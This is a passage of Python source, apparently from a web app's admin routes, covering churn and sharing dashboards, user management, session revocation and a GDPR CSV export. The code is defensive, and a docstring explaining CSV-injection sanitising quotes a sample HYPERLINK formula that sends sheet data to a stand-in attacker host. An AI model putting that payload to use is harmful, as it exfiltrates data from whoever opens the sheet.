    total = funnel["total"] or 1
    funnel_html = (
        '<div style="display:grid;grid-template-columns:repeat(4,1fr);gap:12px">'
        f'<div><div style="font-size:11px;color:var(--text-muted);text-transform:uppercase">Total</div>'
        f'<div style="font-size:24px;font-weight:700;font-variant-numeric:tabular-nums">{funnel["total"]}</div></div>'
        f'<div><div style="font-size:11px;color:var(--text-muted);text-transform:uppercase">Retained</div>'
        f'<div style="font-size:24px;font-weight:700;color:#10b981;font-variant-numeric:tabular-nums">{_fmt_pct(funnel["retained"], total)}</div>'
        f'<div style="font-size:11px;color:var(--text-muted)">{funnel["retained"]} of {funnel["total"]}</div></div>'
        f'<div><div style="font-size:11px;color:var(--text-muted);text-transform:uppercase">Paused</div>'
        f'<div style="font-size:24px;font-weight:700;color:#f59e0b;font-variant-numeric:tabular-nums">{_fmt_pct(funnel["paused"], total)}</div>'
        f'<div style="font-size:11px;color:var(--text-muted)">{funnel["paused"]} of {funnel["total"]}</div></div>'
        f'<div><div style="font-size:11px;color:var(--text-muted);text-transform:uppercase">Cancelled</div>'
        f'<div style="font-size:24px;font-weight:700;color:#ef4444;font-variant-numeric:tabular-nums">{_fmt_pct(funnel["cancelled"], total)}</div>'
        f'<div style="font-size:11px;color:var(--text-muted)">{funnel["cancelled"]} of {funnel["total"]}</div></div>'
        '</div>'
    )

    # Recent cancellations
    if recent:
        rrows = []
        for ca in recent:
            email = html.escape(ca.get("email") or f"user#{ca['user_id']}")
            outcome = ca.get("outcome") or "in_flight"
            outcome_color = {
                "retained": "#10b981",
                "paused": "#f59e0b",
                "cancelled": "#ef4444",
                "in_flight": "var(--text-muted)",
            }.get(outcome, "var(--text-muted)")
            reason = html.escape((ca.get("reason") or "").replace("_", " "))
            started = html.escape(str(ca.get("started_at") or ""))
            pause_info = f" · {ca.get('pause_days')}d pause" if ca.get("pause_days") else ""
            rrows.append(
                f'<tr>'
                f'<td style="padding:8px 12px">{email}</td>'
                f'<td style="padding:8px 12px;color:var(--text-muted);font-size:12px">{started}</td>'
                f'<td style="padding:8px 12px;color:var(--text-muted)">{reason}</td>'
                f'<td style="padding:8px 12px;color:var(--text-muted)">Step {ca.get("reached_step", "?")}</td>'
                f'<td style="padding:8px 12px;color:{outcome_color};font-weight:600;text-transform:capitalize">{outcome.replace("_", " ")}{pause_info}</td>'
                f'</tr>'
            )
        recent_html = (
            '<table style="width:100%;border-collapse:collapse">'
            '<thead><tr style="text-align:left;color:var(--text-muted);font-size:11px;text-transform:uppercase;letter-spacing:0.05em">'
            '<th style="padding:6px 12px">User</th>'
            '<th style="padding:6px 12px">Started</th>'
            '<th style="padding:6px 12px">Reason</th>'
            '<th style="padding:6px 12px">Step</th>'
            '<th style="padding:6px 12px">Outcome</th>'
            '</tr></thead>'
            f'<tbody>{"".join(rrows)}</tbody>'
            '</table>'
        )
    else:
        recent_html = (
            '<div style="padding:24px;text-align:center;color:var(--text-muted);font-size:13px">'
            'No cancellation attempts recorded yet.</div>'
        )

    from admin_shell import render_admin_page
    return render_admin_page(
        request,
        "admin/churn.html",
        page_title="Churn & retention",
        active_route="churn",
        breadcrumb=[("Admin", "/admin"), ("Churn", "/admin/churn")],
        raw_risk_pie=risk_pie_html,
        raw_top_users=top_html,
        raw_funnel=funnel_html,
        raw_recent=recent_html,
        filter_level=level,
        result_count=f"{len(top):,}",
    )


# ── Admin: /admin/sharing ────────────────────────────────────────────────
#
# Renders the share-loop dashboard: total shares by type, top-shared
# markets + sources, top sharers by attributed conversions, referrer +
# country breakdowns, and a daily time series for the chart card.
#
# Data helpers live in queries/sharing_metrics.py — imported lazily so
# a partial schema tree (migrations 110-114 not yet applied) doesn't
# break admin_routes.py at module load. If the module isn't available
# we render a benign "migrations pending" panel instead of crashing.


def _render_totals_table(rows: list[dict]) -> str:
    """Three-row table: market / source / prediction × views + conversions.
    Stable column order even with zero rows (same invariant
    sharing_metrics.totals_by_type already guarantees on the data
    side) so the card layout doesn't shift between empty and full
    states."""
    if not rows:
        return (
            '<div style="padding:24px;text-align:center;color:var(--text-muted);'
            'font-size:13px">No share activity in this window.</div>'
        )
    body = []
    for r in rows:
        rate_label = f"{r['conversion_rate_pct']:.1f}%" if r["views"] else "—"
        body.append(
            "<tr>"
            f"<td style=\"padding:8px 12px;text-transform:capitalize\">{html.escape(r['share_type'])}</td>"
            f"<td style=\"padding:8px 12px;font-variant-numeric:tabular-nums\">{int(r['views']):,}</td>"
            f"<td style=\"padding:8px 12px;font-variant-numeric:tabular-nums\">{int(r['conversions']):,}</td>"
            f"<td style=\"padding:8px 12px;color:var(--text-muted);font-variant-numeric:tabular-nums\">{rate_label}</td>"
            "</tr>"
        )
    return (
        '<table style="width:100%;border-collapse:collapse">'
        '<thead><tr style="text-align:left;color:var(--text-muted);font-size:11px;'
        'text-transform:uppercase;letter-spacing:0.05em">'
        '<th style="padding:6px 12px">Type</th>'
        '<th style="padding:6px 12px">Views</th>'
        '<th style="padding:6px 12px">Conversions</th>'
        '<th style="padding:6px 12px">Rate</th>'
        '</tr></thead>'
        f'<tbody>{"".join(body)}</tbody></table>'
    )


def _render_items_table(rows: list[dict], *, key: str, label: str) -> str:
    """Top-N table for shared_markets / shared_sources. ``key`` is the
    dict column the row label comes from (e.g. 'market_slug')."""
    if not rows:
        return (
            f'<div style="padding:24px;text-align:center;color:var(--text-muted);'
            f'font-size:13px">No shared {label.lower()} yet in this window.</div>'
        )
    body = []
    for r in rows:
        body.append(
            "<tr>"
            f"<td style=\"padding:8px 12px\">{html.escape(str(r.get(key) or '—'))}</td>"
            f"<td style=\"padding:8px 12px;font-variant-numeric:tabular-nums\">{int(r['views']):,}</td>"
            f"<td style=\"padding:8px 12px;font-variant-numeric:tabular-nums;color:var(--text-muted)\">{int(r.get('distinct_shares', 0)):,}</td>"
            f"<td style=\"padding:8px 12px;font-variant-numeric:tabular-nums\">{int(r.get('conversions', 0)):,}</td>"
            "</tr>"
        )
    return (
        '<table style="width:100%;border-collapse:collapse">'
        '<thead><tr style="text-align:left;color:var(--text-muted);font-size:11px;'
        'text-transform:uppercase;letter-spacing:0.05em">'
        f'<th style="padding:6px 12px">{html.escape(label)}</th>'
        '<th style="padding:6px 12px">Views</th>'
        '<th style="padding:6px 12px">Tokens</th>'
        '<th style="padding:6px 12px">Conversions</th>'
        '</tr></thead>'
        f'<tbody>{"".join(body)}</tbody></table>'
    )


def _render_sharers_table(rows: list[dict]) -> str:
    if not rows:
        return (
            '<div style="padding:24px;text-align:center;color:var(--text-muted);'
            'font-size:13px">No attributed conversions yet.</div>'
        )
    body = []
    for r in rows:
        who = html.escape(r.get("username") or r.get("email") or f"user#{r['user_id']}")
        body.append(
            "<tr>"
            f"<td style=\"padding:8px 12px\">{who}</td>"
            f"<td style=\"padding:8px 12px;font-variant-numeric:tabular-nums\">{int(r['conversions']):,}</td>"
            "</tr>"
        )
    return (
        '<table style="width:100%;border-collapse:collapse">'
        '<thead><tr style="text-align:left;color:var(--text-muted);font-size:11px;'
        'text-transform:uppercase;letter-spacing:0.05em">'
        '<th style="padding:6px 12px">User</th>'
        '<th style="padding:6px 12px">Conversions</th>'
        '</tr></thead>'
        f'<tbody>{"".join(body)}</tbody></table>'
    )


def _render_breakdown(rows: list[dict], *, key: str, label: str) -> str:
    """Referrer + country breakdown renderers share a shape."""
    if not rows:
        return (
            '<div style="padding:24px;text-align:center;color:var(--text-muted);'
            'font-size:13px">No data in this window.</div>'
        )
    body = []
    total_views = sum(int(r["views"]) for r in rows) or 1
    for r in rows:
        label_text = html.escape(str(r.get(key) or "—"))
        views = int(r["views"])
        pct = views / total_views * 100
        body.append(
            "<tr>"
            f"<td style=\"padding:8px 12px\">{label_text}</td>"
            f"<td style=\"padding:8px 12px;font-variant-numeric:tabular-nums\">{views:,}</td>"
            f"<td style=\"padding:8px 12px;color:var(--text-muted);font-variant-numeric:tabular-nums\">{pct:.1f}%</td>"
            f"<td style=\"padding:8px 12px;font-variant-numeric:tabular-nums\">{int(r.get('conversions', 0)):,}</td>"
            "</tr>"
        )
    return (
        '<table style="width:100%;border-collapse:collapse">'
        '<thead><tr style="text-align:left;color:var(--text-muted);font-size:11px;'
        'text-transform:uppercase;letter-spacing:0.05em">'
        f'<th style="padding:6px 12px">{html.escape(label)}</th>'
        '<th style="padding:6px 12px">Views</th>'
        '<th style="padding:6px 12px">Share</th>'
        '<th style="padding:6px 12px">Conversions</th>'
        '</tr></thead>'
        f'<tbody>{"".join(body)}</tbody></table>'
    )


def _render_sparkline(series: list[dict]) -> str:
    """Inline SVG sparkline of daily totals. 320×60 viewbox, single
    stroke path — no external chart library because this card is
    admin-only and every KB counts on cold load. Empty series
    renders a muted 'no data' line."""
    totals = [int(r.get("total", 0)) for r in series]
    if not totals or max(totals) == 0:
        return (
            '<div style="padding:24px;text-align:center;color:var(--text-muted);'
            'font-size:13px">No views recorded in this window.</div>'
        )
    mx = max(totals)
    w = 320
    h = 60
    step = w / max(1, (len(totals) - 1))
    pts = []
    for i, v in enumerate(totals):
        x = i * step
        y = h - (v / mx) * (h - 4) - 2
        pts.append(f"{x:.1f},{y:.1f}")
    poly = " ".join(pts)
    last_label = totals[-1]
    peak_label = mx
    # Accessibility: screen readers need the gist of the sparkline.
    # role=img + aria-label summarise peak + current; the visual
    # labels below remain the primary channel for sighted users.
    aria = (
        f"Daily views over {len(totals)} days. "
        f"Peak {peak_label} per day; most recent day {last_label}."
    )
    return (
        f'<svg viewBox="0 0 {w} {h}" width="100%" height="{h}" role="img" '
        f'aria-label="{html.escape(aria)}" '
        'style="display:block;margin-bottom:8px">'
        f'<polyline points="{poly}" fill="none" stroke="currentColor" stroke-width="1.5" '
        'stroke-linecap="round" stroke-linejoin="round"/>'
        '</svg>'
        '<div style="display:flex;justify-content:space-between;'
        'color:var(--text-muted);font-size:11px;font-variant-numeric:tabular-nums">'
        f'<span>peak {peak_label:,}/day</span>'
        f'<span>today {last_label:,}</span>'
        '</div>'
    )


def _render_window_tabs(days: int) -> str:
    """Server-rendered tab strip with the active preset already
    marked. Pre-rendering avoids the post-load class-mutation flash
    the pure-JS version showed on cold navigation."""
    presets = (7, 30, 90)
    out = []
    for d in presets:
        cls = "active" if d == days else ""
        out.append(
            f'<a href="?days={d}" class="{cls}" '
            f'aria-current="{"page" if d == days else "false"}">{d}d</a>'
        )
    return "".join(out)


async def sharing_dashboard(request: Request):
    admin = _require_admin_user(request, page=True)
    if admin is None:
        return _denied_response(request)
    if not isinstance(admin, dict):
        return admin

    # Window selector — default 30 days, clamped to [1, 90]. The query
    # param is the one page-state control this dashboard needs; adding
    # a full form would be a distraction from the numbers.
    qp = request.query_params
    try:
        days = int(qp.get("days", "30"))
    except (TypeError, ValueError):
        days = 30
    days = max(1, min(90, days))

    # source_type pins the table set to a single share family. ``since``
    # accepts YYYY-MM-DD and overrides the ``days`` window when set
    # (caller wants an explicit lower bound for ad-hoc audits).
    source_type = (qp.get("source_type") or "").strip().lower()
    if source_type not in {"", "market", "source", "prediction"}:
        source_type = ""
    since_str = (qp.get("since") or "").strip()
    since_ts = _parse_date_to_ts(since_str)
    if since_ts is not None:
        # Translate explicit since into a days-window for the underlying
        # queries. Cap at 90 so a buggy ?since=1970 doesn't run a 50-year
        # scan, while honouring more recent values verbatim.
        explicit_days = max(1, min(90, (int(time.time()) - since_ts) // 86400 + 1))
        days = explicit_days

    # Lazy import: the module requires migrations 110-114. On a partial
    # schema tree we render a guidance panel instead of a 500.
    try:
        from queries import sharing_metrics as sm
    except Exception as exc:
        log.warning("admin/sharing: queries.sharing_metrics import failed: %s", exc)
        from admin_shell import render_admin_page
        return render_admin_page(
            request,
            "admin/sharing.html",
            page_title="Sharing metrics",
            active_route="sharing",
            breadcrumb=[("Admin", "/admin"), ("Sharing", "/admin/sharing")],
            days=days,
            raw_window_tabs=_render_window_tabs(days),
            raw_summary="<div style=\"padding:24px;color:var(--text-muted);"
                        "font-size:13px\">Sharing metrics unavailable — migrations "
                        "110-114 may not yet be applied on this host.</div>",
            raw_sparkline="",
            raw_totals="",
            raw_top_markets="",
            raw_top_sources="",
            raw_top_sharers="",
            raw_referrers="",
            raw_countries="",
        )

    try:
        overall = sm.overall_stats(days=days)
        totals = sm.totals_by_type(days=days)
        top_markets = sm.top_shared_markets(days=days, limit=10)
        top_sources = sm.top_shared_sources(days=days, limit=10)
        sharers = sm.top_sharers(days=days, limit=10)
        referrers = sm.referrer_breakdown(days=days)
        countries = sm.country_breakdown(days=days, limit=10)
        series = sm.daily_timeseries(days=days)
    except Exception:
        log.exception("admin/sharing: query failure")
        overall = {"window_days": days, "total_views": 0, "total_conversions": 0,
                   "conversion_rate_pct": 0.0, "distinct_countries": 0}
        totals = top_markets = top_sources = sharers = []
        referrers = countries = series = []

    # Post-filter by source_type: hide unrelated tables + trim the totals
    # row down to the requested family. Empty sub-lists render as the
    # "no activity" empty state, which is the right UX for a hard filter.
    if source_type:
        totals = [t for t in totals if (t.get("share_type") or "").lower() == source_type]
        if source_type != "market":
            top_markets = []
        if source_type != "source":
            top_sources = []

    rate_display = (
        f"{overall['conversion_rate_pct']:.1f}%"
        if overall["total_views"] else "—"
    )
    summary = (
        '<div style="display:grid;grid-template-columns:repeat(4,minmax(0,1fr));gap:16px">'
        f'<div><div style="font-size:22px;font-weight:600;font-variant-numeric:tabular-nums">'
        f'{int(overall["total_views"]):,}</div>'
        '<div style="font-size:11px;color:var(--text-muted);text-transform:uppercase;'
        'letter-spacing:0.05em;margin-top:2px">Total views</div></div>'
        f'<div><div style="font-size:22px;font-weight:600;font-variant-numeric:tabular-nums">'
        f'{int(overall["total_conversions"]):,}</div>'
        '<div style="font-size:11px;color:var(--text-muted);text-transform:uppercase;'
        'letter-spacing:0.05em;margin-top:2px">Conversions</div></div>'
        f'<div><div style="font-size:22px;font-weight:600;font-variant-numeric:tabular-nums">'
        f'{rate_display}</div>'
        '<div style="font-size:11px;color:var(--text-muted);text-transform:uppercase;'
        'letter-spacing:0.05em;margin-top:2px">Conversion rate</div></div>'
        f'<div><div style="font-size:22px;font-weight:600;font-variant-numeric:tabular-nums">'
        f'{int(overall["distinct_countries"]):,}</div>'
        '<div style="font-size:11px;color:var(--text-muted);text-transform:uppercase;'
        'letter-spacing:0.05em;margin-top:2px">Countries</div></div>'
        '</div>'
    )

    from admin_shell import render_admin_page
    return render_admin_page(
        request,
        "admin/sharing.html",
        page_title="Sharing metrics",
        active_route="sharing",
        breadcrumb=[("Admin", "/admin"), ("Sharing", "/admin/sharing")],
        days=days,
        raw_window_tabs=_render_window_tabs(days),
        raw_summary=summary,
        raw_sparkline=_render_sparkline(series),
        raw_totals=_render_totals_table(totals),
        raw_top_markets=_render_items_table(
            top_markets, key="market_slug", label="Market",
        ),
        raw_top_sources=_render_items_table(
            top_sources, key="source_handle", label="Source",
        ),
        raw_top_sharers=_render_sharers_table(sharers),
        raw_referrers=_render_breakdown(referrers, key="referrer", label="Referrer"),
        raw_countries=_render_breakdown(countries, key="country", label="Country"),
        filter_source_type=source_type,
        filter_since=since_str,
        result_count=f"{len(totals):,}",
    )


# ── /admin/users — paginated user management ────────────────────────────
#
# Extracted from the /admin monolith as an additive page. The legacy
# /admin route keeps its inline list; this page is the new design-system
# surface (Instrument Serif hero, Inter sans filter bar, Geist Mono IDs,
# editorial body face on prose cells) used as the canonical user-management
# entry point going forward. Per-row mutation routes (promote, suspend,
# impersonate, etc.) re-use the handlers already wired in server.py — this
# page only adds the GET render + new bulk-actions POST.


_USERS_PAGE_LIMIT = 100
_USERS_ROLE_FILTERS = ("", "user", "admin", "super")
_USERS_PLAN_FILTERS = ("", "none", "trader", "pro")


def _users_role_label(level: int) -> tuple[str, str]:
    """Return (display, css-modifier) for the user's role pill."""
    if level >= 2:
        return ("Super admin", "super")
    if level == 1:
        return ("Admin", "admin")
    return ("User", "user")


def _users_filter_match(row, *, q: str, role: str, plan: str, plans_by_user: dict) -> bool:
    """Apply post-fetch filters to a user row.

    SQL-side cursor pagination is preserved; filtering happens in Python
    so we can compose three orthogonal predicates without rebuilding the
    cursor logic. The page size (100) keeps this O(n) loop cheap.
    """
    if q:
        needle = q.lower().lstrip("@")
        email = (row["email"] or "").lower()
        handle = (row["username"] or "").lower()
        if needle not in email and needle not in handle:
            return False
    if role:
        level = row["is_admin"] or 0
        want = role.lower()
        if want == "user" and level != 0:
            return False
        if want == "admin" and level != 1:
            return False
        if want == "super" and level < 2:
            return False
    if plan:
        user_plan = plans_by_user.get(row["id"], "none")
        if plan == "none" and user_plan != "none":
            return False
        if plan == "trader" and user_plan != "trader":
            return False
        if plan == "pro" and user_plan != "pro":
            return False
    return True


def _users_plan_map(user_ids: list) -> dict:
    """Resolve {user_id: tier} for the visible page.

    One aggregate query, then a quick label. Admins always map to ``pro``.
    """
    if not user_ids:
        return {}
    out: dict = {uid: "none" for uid in user_ids}
    placeholders = ",".join(["?"] * len(user_ids))
    with db.conn() as c:
        rows = c.execute(
            f"SELECT user_id, plan FROM subscriptions "
            f"WHERE user_id IN ({placeholders}) AND status = 'active'",
            user_ids,
        ).fetchall()
    for r in rows:
        uid = r["user_id"]
        plan = (r["plan"] or "").lower()
        if "pro" in plan:
            out[uid] = "pro"
        elif "trader" in plan:
            if out[uid] != "pro":
                out[uid] = "trader"
        else:
            if out[uid] == "none":
                out[uid] = "trader"  # Any other active row counts as paid.
    # Admins map to pro regardless of subscriptions.
    with db.conn() as c:
        adm_rows = c.execute(
            f"SELECT id FROM users WHERE id IN ({placeholders}) AND is_admin >= 1",
            user_ids,
        ).fetchall()
    for r in adm_rows:
        out[r["id"]] = "pro"
    return out


def _users_last_active(user_ids: list) -> dict:
    """Resolve {user_id: epoch} of the most recent ``user_sessions`` row.

    Falls back to 0 for users who never had a hardened session. Rendering
    shows "—" in that case.
    """
    if not user_ids:
        return {}
    placeholders = ",".join(["?"] * len(user_ids))
    out: dict = {uid: 0 for uid in user_ids}
    try:
        with db.conn() as c:
            rows = c.execute(
                f"SELECT user_id, MAX(last_active_at) AS la "
                f"FROM user_sessions WHERE user_id IN ({placeholders}) "
                f"GROUP BY user_id",
                user_ids,
            ).fetchall()
        for r in rows:
            if r["la"]:
                out[r["user_id"]] = int(r["la"])
    except Exception:
        pass
    return out


def _users_render_options(current: str, choices) -> str:
    """Render <option>s for the role/plan dropdowns. Empty value = ``All``."""
    parts = []
    for value in choices:
        sel = " selected" if value == current else ""
        label = "All" if value == "" else value.title()
        parts.append(
            f'<option value="{html.escape(value)}"{sel}>{html.escape(label)}</option>'
        )
    return "".join(parts)


def _users_render_row(
    u, *, plan_tier: str, last_active: int, csrf_field: str, caller_level: int
) -> str:
    """Render a single <tr>. CSRF token reused across the page."""
    uid = int(u["id"])
    email = u["email"] or ""
    handle = u["username"] or ""
    level = int(u["is_admin"] or 0)
    role_label, role_mod = _users_role_label(level)
    is_super = caller_level >= 2
    can_manage = is_super or (caller_level == 1 and level == 0)

    plan_label = {"none": "Free", "trader": "Trader", "pro": "Pro"}.get(plan_tier, plan_tier.title())
    plan_mod = plan_tier if plan_tier in ("trader", "pro") else "none"

    created_label = _fmt_ts(u["created_at"], "%Y-%m-%d")
    last_label = _fmt_ts(last_active, "%Y-%m-%d %H:%M UTC") if last_active else "—"

    # Per-row actions
    actions: list = []
    if can_manage:
        # Impersonate — POSTs to the existing handler with a prompted reason.
        actions.append(
            f'<form method="post" action="/admin/users/{uid}/impersonate" '
            f'onsubmit="var r=prompt(\'Reason for impersonating {html.escape(handle or email)} (min 4 chars):\');'
            f'if(!r||r.trim().length&lt;4){{return false;}}this.reason.value=r.trim();return true;">'
            f'{csrf_field}'
            f'<input type="hidden" name="reason" value="">'
            f'<button class="btn" type="submit">Impersonate</button></form>'
        )
        # Promote / revoke admin
        if level == 0:
            actions.append(
                f'<form method="post" action="/admin/users/{uid}/promote" '
                f'onsubmit="return confirm(\'Promote {html.escape(handle or email)} to admin?\')">'
                f'{csrf_field}'
                f'<button class="btn" type="submit">Promote to admin</button></form>'
            )
        elif level == 1:
            actions.append(
                f'<form method="post" action="/admin/users/{uid}/demote" '
                f'onsubmit="return confirm(\'Revoke admin from {html.escape(handle or email)}?\')">'
                f'{csrf_field}'
                f'<button class="btn btn--danger" type="submit">Revoke admin</button></form>'
            )
        # Revoke all sessions
        actions.append(
            f'<form method="post" action="/admin/users/{uid}/revoke-sessions" '
            f'onsubmit="return confirm(\'Revoke all active sessions for {html.escape(handle or email)}?\')">'
            f'{csrf_field}'
            f'<button class="btn btn--danger" type="submit">Revoke sessions</button></form>'
        )
        # Export data (GDPR) — POST so we get CSRF coverage + the action
        # never fires from a passive <img>/<a> in another tab.
        actions.append(
            f'<form method="post" action="/admin/users/{uid}/export" '
            f'style="display:inline">'
            f'{csrf_field}'
            f'<button class="btn" type="submit">Export data</button></form>'
        )
    else:
        actions.append('<span style="color:var(--text-tertiary);font-size:12px">Insufficient</span>')

    checkbox = (
        f'<input type="checkbox" form="adm-users-bulk" '
        f'class="adm-users-row__checkbox" name="user_ids" value="{uid}" '
        f'aria-label="Select user {html.escape(handle or email)}">'
        if can_manage else ''
    )

    return (
        f'<tr>'
        f'<td class="adm-users-td adm-users-td--check">{checkbox}</td>'
        f'<td class="adm-users-row__id">{uid}</td>'
        f'<td class="adm-users-row__email">{html.escape(email)}</td>'
        f'<td class="adm-users-row__handle">{html.escape(handle)}</td>'
        f'<td><span class="adm-users-row__role adm-users-row__role--{role_mod}">'
        f'{html.escape(role_label)}</span></td>'
        f'<td><span class="adm-users-row__plan adm-users-row__plan--{plan_mod}">'
        f'{html.escape(plan_label)}</span></td>'
        f'<td class="adm-users-row__ts">{html.escape(created_label)}</td>'
        f'<td class="adm-users-row__ts">{html.escape(last_label)}</td>'
        f'<td><div class="adm-users-row__actions">{"".join(actions)}</div></td>'
        f'</tr>'
    )


async def users_page(request: Request):
    admin = _require_admin_user(request, page=True)
    if admin is None:
        return _denied_response(request)
    if not isinstance(admin, dict):
        return admin

    caller_level = int(admin.get("admin_level") or 1)

    # Cursor + filters from query string
    qp = request.query_params
    q = (qp.get("q") or "").strip()[:120]
    role = (qp.get("role") or "").strip().lower()
    plan = (qp.get("plan") or "").strip().lower()
    if role not in _USERS_ROLE_FILTERS:
        role = ""
    if plan not in _USERS_PLAN_FILTERS:
        plan = ""

    before_id = None
    raw_before = qp.get("before_id")
    if raw_before and str(raw_before).isdigit():
        before_id = int(raw_before)

    # SQL-side cursor pagination
    users = db.list_all_users(limit=_USERS_PAGE_LIMIT, before_id=before_id)
    user_ids = [int(u["id"]) for u in users]
    plans_by_user = _users_plan_map(user_ids)
    last_active_by_user = _users_last_active(user_ids)

    # Apply post-fetch filters
    filtered = [
        u for u in users
        if _users_filter_match(u, q=q, role=role, plan=plan, plans_by_user=plans_by_user)
    ]

    # Reusable CSRF field — same token across every row form
    srv = _srv()
    try:
        token = (
            request.cookies.get(srv.CSRF_COOKIE_NAME)
            or getattr(getattr(request, "state", None), "csrf_token", None)
            or srv._generate_csrf_token()
        )
    except Exception:
        token = ""
    csrf_field = (
        f'<input type="hidden" name="{srv.CSRF_FORM_FIELD}" value="{html.escape(token)}">'
        if token else ""
    )

    row_html = "".join(
        _users_render_row(
            u,
            plan_tier=plans_by_user.get(int(u["id"]), "none"),
            last_active=last_active_by_user.get(int(u["id"]), 0),
            csrf_field=csrf_field,
            caller_level=caller_level,
        )
        for u in filtered
    ) or (
        '<tr><td colspan="9" class="adm-users-empty">'
        'No users match these filters.'
        '</td></tr>'
    )

    # Cursor pagination — only render the "Load more" link if the SQL
    # page filled. (filtered may be shorter, but the cursor is anchored
    # on the SQL slice so we don't skip rows.)
    pagination_html = ""
    if len(users) >= _USERS_PAGE_LIMIT and users:
        next_cursor = int(users[-1]["id"])
        params = []
        if q:
            params.append(f"q={html.escape(q)}")
        if role:
            params.append(f"role={html.escape(role)}")
        if plan:
            params.append(f"plan={html.escape(plan)}")
        params.append(f"before_id={next_cursor}")
        href = "/admin/users?" + "&amp;".join(params)
        pagination_html = (
            f'<a class="btn" href="{href}" rel="next">Load more</a>'
        )

    role_options = _users_render_options(role, _USERS_ROLE_FILTERS)
    plan_options = _users_render_options(plan, _USERS_PLAN_FILTERS)

    from admin_shell import render_admin_page
    return render_admin_page(
        request,
        "admin/users.html",
        page_title="Users",
        active_route="users",
        breadcrumb=[("Admin", "/admin"), ("Users", "/admin/users")],
        filter_q=q,
        raw_role_options=role_options,
        raw_plan_options=plan_options,
        raw_user_rows=row_html,
        raw_pagination=pagination_html,
        raw_csrf_field=csrf_field,
    )


async def users_revoke_sessions(request: Request, user_id: int):
    """POST /admin/users/{user_id}/revoke-sessions — kill every active session.

    CSRF-protected by the global middleware. Returns to /admin/users so
    the action stays scoped to the new page.
    """
    admin = _require_admin_user(request)
    target = db.get_user_by_id(user_id)
    if not target:
        raise HTTPException(status_code=404, detail="User not found")
    caller_level = int(admin.get("admin_level") or 1)
    target_level = int(target["is_admin"] or 0)
    if caller_level < 2 and target_level >= caller_level:
        raise HTTPException(status_code=403, detail="Insufficient permissions")

    revoked = 0
    try:
        from queries import auth as _auth_q
        revoked = _auth_q.revoke_all_user_sessions(user_id)
    except Exception as exc:
        log.warning("revoke_all_user_sessions failed for user_id=%d: %s", user_id, exc)
    # Also kill the legacy `sessions` rows for full coverage.
    try:
        with db.conn() as c:
            c.execute("DELETE FROM sessions WHERE user_id = ?", (user_id,))
    except Exception:
        pass

    try:
        from security import audit as _a
        _audit(
            _a.AuditAction.USER_SUSPEND,  # closest existing action — represents an admin-forced session kill
            admin=admin, request=request,
            target_type="user", target_id=user_id,
            target_description=target["email"],
            notes=f"revoked_sessions={revoked}",
        )
    except Exception:
        pass

    return RedirectResponse("/admin/users", status_code=302)


def _csv_safe_cell(value) -> str:
    """Defang CSV-injection payloads.

    Spreadsheet apps (Excel, Numbers, Google Sheets) evaluate any cell
    whose first character is ``=``, ``+``, ``-``, ``@``, tab, or carriage
    return as a formula. A username like ``=HYPERLINK("http://atk/?c="&A1,"x")``
    will exfiltrate the admin's sheet on open. Prefix with a single quote
    so the cell is rendered as literal text. NUL bytes are dropped because
    Excel treats them as a row separator on some platforms.
    """
    if value is None:
        return ""
    s = str(value).replace("\x00", "")
    if s and s[0] in ("=", "+", "-", "@", "\t", "\r"):
        return "'" + s
    return s


async def users_export_data(request: Request, user_id: int):
    """POST /admin/users/{user_id}/export — admin GDPR export shortcut.

    The full export pipeline lives in ``export_routes`` (rate-limited to
    1/day/user). Admins responding to a GDPR request for a *different*
    user can use this shortcut to hand the user a CSV of their account
    snapshot inline — same shape, smaller scope than the async export ZIP.

    POST (not GET) because this writes an audit row and returns PII. A GET
    surface would let an attacker page silently exfiltrate via
    ``<img src="/admin/users/N/export">`` in an authed admin's browser.
    CSRF is enforced both by the global middleware and by the explicit
    re-check below (defense in depth).
    """
    admin = _require_admin_user(request, page=True)
    if admin is None:
        return _denied_response(request)

    # Explicit CSRF re-check on top of the middleware. The middleware
    # already enforced this for POST, but a second check inside the
    # handler keeps the property local to the function and survives
    # accidental middleware-exemption changes.
    srv = _srv()
    form = await request.form()
    submitted = form.get(srv.CSRF_FORM_FIELD) or request.headers.get(
        getattr(srv, "CSRF_HEADER_NAME", "x-csrf-token")
    )
    if not srv._validate_csrf(request, submitted):
        raise HTTPException(status_code=403, detail="CSRF validation failed")

    target = db.get_user_by_id(user_id)
    if not target:
        raise HTTPException(status_code=404, detail="User not found")

    import csv
    import io as _io
    buf = _io.StringIO()
    w = csv.writer(buf)
    w.writerow(["field", "value"])
    safe_keys = (
        "id", "email", "username", "created_at",
        "is_admin", "suspended", "default_dashboard",
    )
    for k in safe_keys:
        try:
            w.writerow([_csv_safe_cell(k), _csv_safe_cell(target[k])])
        except (IndexError, KeyError):
            continue

    try:
        from security import audit as _a
        _audit(
            _a.AuditAction.USER_EXPORT_DATA,
            admin=admin, request=request,
            target_type="user", target_id=user_id,
            target_description=target["email"],
            notes="admin gdpr export shortcut",
        )
    except Exception:
        pass

    from fastapi.responses import Response as _Response
    return _Response(
        content=buf.getvalue(),
        media_type="text/csv; charset=utf-8",
        headers={
            "Content-Disposition": f'attachment; filename="user_{user_id}_export.csv"',
            "Cache-Control": "no-store",
        },
    )


async def users_bulk_actions(request: Request):
    """POST /admin/users/bulk-actions — checkbox-driven multi-user actions.

    Supported actions:
      - ``email``     → reserve the action for the email-blast flow.
                         Records the intent in the audit log and bounces
                         back; the actual send pipeline lives behind a
                         separate confirmation step.
      - ``allowlist`` → mint a one-shot invite token tied to each
                         selected email (existing closest concept).
    CSRF is enforced by the middleware. Caller-permission checks mirror
    ``/admin/users/bulk`` in server.py.
    """
    admin = _require_admin_user(request)
    form = await request.form()
    action = (form.get("bulk_action") or "").strip().lower()
    raw_ids = form.getlist("user_ids") if hasattr(form, "getlist") else []
    user_ids = [
        int(uid) for uid in raw_ids
        if isinstance(uid, str) and uid.isdigit() and int(uid) != 1
    ]

    if action not in ("email", "allowlist") or not user_ids:
        return RedirectResponse("/admin/users", status_code=302)

    caller_level = int(admin.get("admin_level") or 1)
    affected = 0
    for uid in user_ids:
        target = db.get_user_by_id(uid)
        if not target:
            continue
        target_level = int(target["is_admin"] or 0)
        if caller_level < 2 and target_level >= caller_level:
            continue
        if action == "email":
            # Intent only — the dispatch happens via /admin/emails so the
            # bulk surface stays idempotent and re-requestable.
            affected += 1
        elif action == "allowlist":
            try:
                db.create_invite_token(
                    note=f"Bulk allowlist via /admin/users for {target['email']}",
                    target_email=target["email"],
                )
                affected += 1
            except Exception as exc:
                log.warning("bulk allowlist failed for user_id=%d: %s", uid, exc)

    try:
        from security import audit as _a
        _audit(
            _a.AuditAction.USER_BULK_ACTION,
            admin=admin, request=request,
            target_type="user", target_id=None,
